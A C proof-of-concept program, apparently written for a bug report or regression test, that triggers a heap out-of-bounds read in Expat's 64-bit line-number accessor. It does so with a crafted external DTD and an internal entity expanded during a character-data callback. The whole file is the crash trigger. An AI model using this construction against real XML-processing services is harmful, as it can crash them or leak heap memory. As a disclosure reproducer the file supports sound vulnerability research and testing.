/*
 * Proof of concept: heap out-of-bounds read in the 64-bit location
 * accessors of Expat.
 *
 * XML_GetCurrentLineNumber64 (and XML_GetCurrentColumnNumber64) relate
 * the reported position to the internal event when called from a
 * handler while an internal entity is being expanded.  The position
 * update then scans from the parse buffer up to the entity text in the
 * DTD string pool and runs past the end of the parse buffer.
 *
 * The document below is well-formed XML, the external DTD subset is
 * supplied through the documented external entity handler, and the
 * accessor is called the documented way, i.e. from a handler callback.
 *
 * Expected: AddressSanitizer: heap-buffer-overflow ... READ of size 1
 */
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* Weak reference: against builds of Expat that lack the 64-bit location
   accessors this program links (and exits) just fine. */
struct XML_ParserStruct;
extern uint64_t XML_GetCurrentLineNumber64(struct XML_ParserStruct *parser)
    __attribute__((weak));

#include "expat.h"

/* The replacement text of entity "big" is assembled from parameter
   entity "c" at declaration time and ends up in a DTD string pool
   block of its own, far away from the (small) parse buffer. */
#define CHUNK_LEN 1024
#define CHUNK_REFS 300

static void XMLCALL
on_characters(void *userData, const XML_Char *s, int len) {
  XML_Parser parser = (XML_Parser)userData;
  (void)s;
  (void)len;
  printf("line number: %llu\n",
         (unsigned long long)XML_GetCurrentLineNumber64(parser));
}

static int XMLCALL
on_external_entity(XML_Parser parser, const XML_Char *context,
                   const XML_Char *base, const XML_Char *systemId,
                   const XML_Char *publicId) {
  (void)base;
  (void)systemId;
  (void)publicId;

  const size_t dtdLen = sizeof("<!ENTITY % c ''>") + CHUNK_LEN
                        + sizeof("<!ENTITY big ''>") + 7U * CHUNK_REFS;
  char *const dtd = malloc(dtdLen);
  if (dtd == NULL)
    return XML_STATUS_ERROR;

  char *p = dtd;
  p += sprintf(p, "<!ENTITY %% c '");
  memset(p, 'A', CHUNK_LEN);
  p += CHUNK_LEN;
  strcpy(p, "'>\n<!ENTITY big '");
  p += strlen(p);
  for (int i = 0; i < CHUNK_REFS; i++) {
    memcpy(p, "%c;", 3);
    p += 3;
  }
  strcpy(p, "'>\n");

  XML_Parser child = XML_ExternalEntityParserCreate(parser, context, NULL);
  if (child == NULL) {
    free(dtd);
    return XML_STATUS_ERROR;
  }
  const enum XML_Status status
      = XML_Parse(child, dtd, (int)strlen(dtd), XML_TRUE);
  if (status == XML_STATUS_ERROR)
    fprintf(stderr, "external DTD error: %s\n",
            XML_ErrorString(XML_GetErrorCode(child)));
  XML_ParserFree(child);
  free(dtd);
  return status == XML_STATUS_ERROR ? XML_STATUS_ERROR : XML_STATUS_OK;
}

int
main(void) {
  if (&XML_GetCurrentLineNumber64 == NULL) {
    printf("XML_GetCurrentLineNumber64 is not available, nothing to do.\n");
    return 0;
  }

  XML_Parser parser = XML_ParserCreate(NULL);
  if (parser == NULL)
    return 1;
  XML_SetUserData(parser, parser);
  XML_SetCharacterDataHandler(parser, on_characters);
  XML_SetParamEntityParsing(parser, XML_PARAM_ENTITY_PARSING_ALWAYS);
  XML_SetExternalEntityRefHandler(parser, on_external_entity);

  const char doc[] = "<!DOCTYPE d SYSTEM 'poc.dtd'>\n<d>&big;</d>\n";
  if (XML_Parse(parser, doc, (int)strlen(doc), XML_TRUE)
      == XML_STATUS_ERROR) {
    fprintf(stderr, "Parse error: %s (line %llu)\n",
            XML_ErrorString(XML_GetErrorCode(parser)),
            (unsigned long long)XML_GetCurrentLineNumber(parser));
    XML_ParserFree(parser);
    return 1;
  }

  XML_ParserFree(parser);
  printf("Done, no out-of-bounds access.\n");
  return 0;
}
